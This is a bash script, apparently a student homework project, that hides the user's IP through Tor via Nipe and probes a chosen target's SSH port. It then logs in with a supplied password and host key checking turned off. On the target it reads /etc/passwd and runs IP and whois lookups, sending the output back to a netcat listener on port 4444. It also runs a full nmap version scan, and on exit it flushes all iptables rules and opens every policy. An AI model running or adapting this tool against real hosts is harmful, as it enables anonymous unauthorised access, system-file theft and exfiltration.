#!/bin/bash

#+-----------------------------------------------------------------------------------------+
#|                                                                                         |
#|                     Bash Script for Anonymous Remote Host Scanning                      |
#|                                                                                         |
#|  ▸ Checks for required utilities: curl, jq, nmap, perl, ssh, tor, and more              |
#|  ▸ Automatically installs 'nipe' to route traffic through the TOR network               |
#|  ▸ Masks your IP address and verifies anonymity                                         |
#|  ▸ Checks SSH accessibility of the target host                                          |
#|  ▸ Connects via SSH (using sshpass), executes reconnaissance commands                   |
#|  ▸ Gathers system and IP-related information and sends it via netcat                    |
#|  ▸ Saves all results in a timestamped directory                                         |
#|  ▸ On any script termination (error, Ctrl+C, or exit), clears iptables and stops Nipe   |
#|  ▸ Metasploitable2 was used as a testbed for development and debugging.                 |
#|  ▸ This is just a homework project — you will not be able to hack anyone with it 🙂     |
#|                                                                                         |
#|                              Requires root privileges!                                  |
#|                                                                                         |
#+-----------------------------------------------------------------------------------------+


# Global variables used to store key paths, IP information, and working directories
nipe_path=""
real_ip=""
real_country=""
main_dir=""
working_dir=""
timestamp=""
password=""
username=""
target=""
script_start=$(date +%s)


# SPINNER - Function to display a rotating spinner
# - Indicates that a background process is running
# - Shows a red rotating spinner (| / - \) and green "..." while waiting
# - The original idea and base code for this function were developed by ChatGPT.
# - The function was further refined and adapted by the script's author.
SPINNER() 
{
    local pid=$1
    local done_message=${3:-""}
    local delay=0.2
    local spinstr='|/-\'

    # Loop while the process with the given PID is still running
    while kill -0 "$pid" 2>/dev/null; do
        for (( i=0; i<${#spinstr}; i++ )); do
            printf "\r\e[31m[%c]\e[0m %s\e[32m...\e[0m" "${spinstr:$i:1}"
            sleep $delay
        done
    done

    # Clear the line after the spinner ends
    printf "\r%-60s\r" ""
}


# START - Function to initialize the script
# - Verifies if the script is run as root
# - Displays a banner using figlet
# - Creates main and working directories for storing results
# - Changes to the working directory
# - Calls the function to check internet connection
START()
{
    local user=$(whoami)

    # Check if the script is run with root privileges
    if [[ "$user" != "root" ]]; then
        echo -e "\n\e[91m\e[107m[!] You must run this script as root.\e[0m\n"
        exit
    else
        # Generate a timestamp for naming result directories
        timestamp=$(date +"%d%m%H%M%S")

        # Display the project banner
        figlet "REMOTE CONTROL"
        echo -e "\nOleksandr Shevchuk S21, TMagen773637, Erel Regev\n"

        # Set the path for the main results directory
        main_dir=$(pwd)/remote_control_results
        mkdir -p "$main_dir" > /dev/null 2>&1

        # Create a subdirectory named with the timestamp
        cd "$main_dir"
        working_dir="$(pwd)/$timestamp"
        mkdir -p "$working_dir"
        cd "$working_dir"

        # Display the current working directory
        echo -e "\e[30m\e[107mCurrent working directory: $(pwd)\e[0m\n"

        # Call the function to verify internet connectivity
        CHECK_INTERNET_CONNECTION
    fi     
}


# CHECK_INTERNET_CONNECTION - Function to verify internet connectivity
# - Displays a message about checking required utilities
# - Pings 8.8.8.8 to test internet access
# - If successful, updates the package list and calls CHECK_APP
# - If unsuccessful, displays a warning and exits the script
CHECK_INTERNET_CONNECTION()
{
    # Inform the user that the script is checking for required utilities
    echo -e "\e[31m[*]\e[0m\e[34m Checking for the presence of utilities required for performing the analysis:\e[0m"
    sleep 2

    # Attempt to ping Google's DNS server with a 3-second timeout
    if ping -c 1 -W 3 8.8.8.8 > /dev/null 2>&1; then
        # If ping is successful, silently update the package list
        apt update > /dev/null 2>&1 &
        SPINNER $!
        # Call function to check required applications
        CHECK_APP
    else
        # If ping fails, notify the user and exit
        echo -e "\n\e[91m\e[107m[!] No internet connection. Check your network.\e[0m\n"
        sleep 2
        exit 1
    fi
}


# CHECK_APP - Function to verify and install required utilities
# - Defines a list of essential utilities for the script
# - Checks whether each utility is installed
# - If not installed, attempts to install it using apt
# - Displays the status of each utility
# - Calls the CHECK_NIPE function after verification
CHECK_APP()
{
    # Define a list of required utilities
    local utilities_for_check="curl jq nmap perl ssh sshpass tor whois"

    # Iterate through each utility in the list
    for i in $utilities_for_check; do
        # Check if the utility is installed
        if ! command -v "$i" > /dev/null 2>&1; then
            # If not installed, print a warning and attempt to install it
            echo -e "\e[91m\e[107m[!] '$i' is not installed.\e[0m"
            apt install "$i" -y || { echo -e "\e[91m\e[107m[!] Failed to install '$i'.\e[0m"; exit 1; }
        else
            # If already installed, print success message
            echo -e "\e[32m[✔] $i\e[0m"
        fi
        sleep 0.6
    done

    # Call the CHECK_NIPE function to continue
    CHECK_NIPE
}


# CHECK_NIPE - Function to check for and install the 'nipe' anonymity tool
# - Searches for the nipe.pl script on the system
# - If not found, attempts to clone and install 'nipe' and its dependencies
# - Verifies the creation of necessary directories and installation steps
# - Calls the RUN_NIPE function after completion
CHECK_NIPE()
{
    # Search for the nipe.pl script on the system
    nipe_path=$(find /opt/nipe -type f -name nipe.pl 2>/dev/null)

    # If nipe is not found, install it
    if [[ -z "$nipe_path" ]]; then
        echo -e "\e[91m\e[107m[!] 'nipe.pl' not found on the system.\e[0m"
        echo -e "\e[31m[*]\e[0m\e[34m Installing nipe...\e[0m"
        
        # Check if /opt directory exists, create it if not
        if [[ ! -d /opt ]]; then
            mkdir -p /opt || { 
                echo -e "\e[91m\e[107m[!] Failed to create /opt directory.\e[0m"
                exit 1
            }
        fi

        # Navigate to /opt and clone the nipe repository
        cd /opt
        
        git clone https://github.com/htrgouvea/nipe.git || {
            echo -e "\e[91m\e[107m[!] Failed to clone nipe.\e[0m"
            exit 1
        } & SPINNER $!
        
        # Change to the nipe directory
        cd nipe || { echo -e "\e[91m\e[107m[!] Failed to change directory to /opt/nipe.\e[0m"; exit 1; }
        
        # Install required CPAN modules
        yes | cpan install Try::Tiny Config::Simple JSON || {
            echo -e "\e[91m\e[107m[!] Failed to install CPAN modules.\e[0m"
            exit 1
        }

        # Run nipe installation
        perl nipe.pl install || {
            echo -e "\e[91m\e[107m[!] Failed to install nipe.\e[0m"
            exit 1
        }

        # Inform the user of successful installation
        echo -e "\e[31m[*]\e[0m\e[32m nipe installed successfully\e[0m"
        
        # Search again for the nipe.pl path
        nipe_path=$(find /opt/nipe -type f -name nipe.pl 2>/dev/null)
    else
        # If nipe was already found, confirm it
        echo -e "\e[32m[✔] nipe\e[0m"
    fi

    # Call the RUN_NIPE function
    RUN_NIPE
}


# RUN_NIPE - Function to start and verify the Nipe anonymization service
# - Retrieves and displays the real IP and country before Nipe is started
# - Starts the Nipe service and waits for it to become active
# - If the status is not "true", restarts Nipe until it works (up to 20 attempts)
# - Displays the new IP and country after Nipe is enabled
RUN_NIPE()
{
    # Get the real external IP address before activating Nipe
    real_ip=$(curl -s http://ip-api.com/json | jq -r '.query')
    echo -e "\n\e[31m[*]\e[0m\e[32m Your IP before nipe.pl: \e[0m$real_ip"
    sleep 0.6

    # Get the real country based on the current IP
    real_country=$(curl -s http://ip-api.com/json | jq -r '.country')
    echo -e "\e[31m[*]\e[0m\e[32m Your country before nipe.pl: \e[0m$real_country" 

    # Notify the user that Nipe is being started
    echo -e "\e[31m[*]\e[0m\e[34m Starting Nipe...\e[0m"

    # Change to the Nipe installation directory and start it
    cd /opt/nipe
    perl nipe.pl start > /dev/null 2>&1 &
    nipe_pid=$!
    SPINNER $nipe_pid

    # Attempt to verify Nipe status up to 20 times
    for i in {1..20}; do
        # Get the current status of Nipe
        nipe_status=$(perl nipe.pl status | grep -i "status" | awk '{print $3}')
        if [[ "$nipe_status" == "true" ]]; then
            # If Nipe is active, confirm anonymity
            echo -e "\e[31m[!]\e[0m\e[32m You are anonymous!\e[0m"
            break
        else
            # Notify the user of the waiting status
            echo -e "\e[31m[$i]\e[0m\e[34m Waiting for Nipe to be ready...\e[0m"
            # If not active, attempt to restart Nipe
            perl nipe.pl restart > /dev/null 2>&1 &
            restart_pid=$!
            SPINNER $restart_pid
        fi
        # Notify the user of the waiting status
        #echo -e "\e[31m[$i]\e[0m\e[34m Waiting for Nipe to be ready...\e[0m"
        #sleep 10
    done

    # Get and display the new IP address after Nipe is enabled
    local new_ip=$(curl -s http://ip-api.com/json | jq -r '.query')
    echo -e "\e[31m[*]\e[0m\e[32m NEW IP: \e[0m$new_ip"

    # Get and display the new country based on the new IP
    local new_country=$(curl -s http://ip-api.com/json | jq -r '.country')
    echo -e "\e[31m[*]\e[0m\e[32m NEW country: \e[0m$new_country"

    CHECK_SSH
}


# CHECK_SSH - Function to check SSH accessibility of a remote host
# - Prompts the user for target IP address and SSH username
# - Checks if TCP port 22 is open using netcat with a 10-second timeout
# - If the port is open, attempts to initiate an SSH connection
# - If the port is closed or the host is unreachable, offers to check another IP
CHECK_SSH()
{
    # Prompt the user for the target IP address and SSH username
    read -p $'\e[31m[!]\e[0m\e[34m Enter target IP address: \e[0m' target
    echo

    # Check if port 22 is open using netcat (nc)
    if nc -z  -w10 "$target" 22; then
        echo -e "\e[31m[*]\e[0m\e[32m Port 22 is open on\e[0m "$target" \e[32m— attempting to connect...\e[0m"
        SCANNING
    else
        # If port 22 is closed or the host is unreachable, notify the user and offer to check another IP.
        # If the user agrees, rerun the SSH check.
        echo -e "\e[91m\e[107m[!] Port 22 is closed or the host is unreachable — SSH connection not possible.\e[0m\n"
        sleep 2
        read -p $'\e[31m[*]\e[0m\e[32m Would you like to check another IP? (y/n): \e[0m' choice
        if [[ "$choice" == "y" ]]; then
            CHECK_SSH
        else
            exit
        fi
    fi
}


# SCANNING performs internal scanning of the target with nmap and executing remote system information commands over SSH.  
# The output is sent back via netcat to the local host and saved to a log file before cleanup.
SCANNING()
{
    cd "$working_dir"
    
    echo -e "Target: "$target"\n" >> log_$timestamp.txt

    host_ip=$(ip route get 1.1.1.1 | awk '{print $7}')

    read -p $'\e[31m[!]\e[0m\e[34m Enter SSH username: \e[0m' username
    read -p $'\e[31m[!]\e[0m\e[34m Enter SSH password: \e[0m' password

    echo -e "\n\e[31m[!]\e[0m\e[32m Please wait, the target machine is being scanned...\e[0m"
    
    # Run nmap version detection scan on the target and append output to log_$timestamp.txt
    nmap -p- -Pn -sV "$target" >> log_$timestamp.txt &
    SPINNER $!
    
    if [[ -n "$username" && -n "$password" ]]; then
      # Start a netcat listener to collect the data sent back from the target
      nc -l -p 4444 >> log_$timestamp.txt &
      nc_pid=$!
    
      # Give netcat time to start properly
      sleep 2

      echo -e "\e[31m[!]\e[0m\e[32m Executing remote commands and receiving data...\e[0m"

      # Connect to the target via SSH and run a chain of reconnaissance commands
      sshpass -p "$password" ssh -o HostKeyAlgorithms=+ssh-rsa \
        -o PubkeyAcceptedKeyTypes=+ssh-rsa \
        -o StrictHostKeyChecking=no "$username@$target" \
        'bash -c "echo; uptime; echo; whoami; echo; pwd; echo; ls -l; echo;
        cat /etc/passwd; echo; curl -s ipinfo.io/$(curl -s ifconfig.me);
        echo; curl -s http://ip-api.com/json/; echo;
        echo; whois $(curl -s ifconfig.me) 2>/dev/null"' \
        | nc "$host_ip" 4444 &  # Send the output to the netcat listener

      # Wait briefly and then kill the netcat process to clean up
      sleep 2
      kill "$nc_pid" 2>/dev/null

      echo -e "\e[31m[!]\e[0m\e[32m Data received and successfully saved to the logfile!\e[0m"
      exit
    else
      echo -e "\e[91m\e[107m[!] To connect via SSH, you must provide valid credentials.\e[0m"
      rm -rf log_$timestamp.txt
      CHECK_SSH
    fi
}


# STOP - Function to gracefully stop the script and restore system state
# - Calculates and displays the total duration of script execution
# - Stops the Nipe service and shows its status
# - Resets iptables rules to default policy (ACCEPT) and flushes existing rules
STOP()
{
    # Record the script end time and calculate duration
    local script_end=$(date +%s)
    local duration=$((script_end - script_start))


    # Stop the Nipe service and display its status
    cd /opt/nipe
    perl nipe.pl stop 2>/dev/null
    sleep 2
    real_ip=$(curl -s http://ip-api.com/json | jq -r '.query')
    real_country=$(curl -s http://ip-api.com/json | jq -r '.country')
    echo -e "\e[91m\e[107m[!] Nipe is stopped. You are not anonymous.\e[0m\n"
    sleep 0.5
    echo -e "\e[31m[*]\e[0m\e[32m Your IP: \e[0m$real_ip"
    sleep 0.5
    echo -e "\e[31m[*]\e[0m\e[32m Your country: \e[0m$real_country"
    sleep 0.5
    echo -e "\e[31m[*]\e[0m\e[32m Script finished. \e[0mDuration: $((duration / 60)) min $((duration % 60)) sec"
    sleep 0.5


    # Reset iptables rules and policies
    iptables -F 2>/dev/null
    iptables -X 2>/dev/null
    iptables -t nat -F 2>/dev/null
    iptables -t nat -X 2>/dev/null
    iptables -P INPUT ACCEPT 2>/dev/null
    iptables -P FORWARD ACCEPT 2>/dev/null
    iptables -P OUTPUT ACCEPT 2>/dev/null
}

# trap - Ensures the STOP function is called automatically when the script exits
trap STOP EXIT

# Start the script by calling the START function
START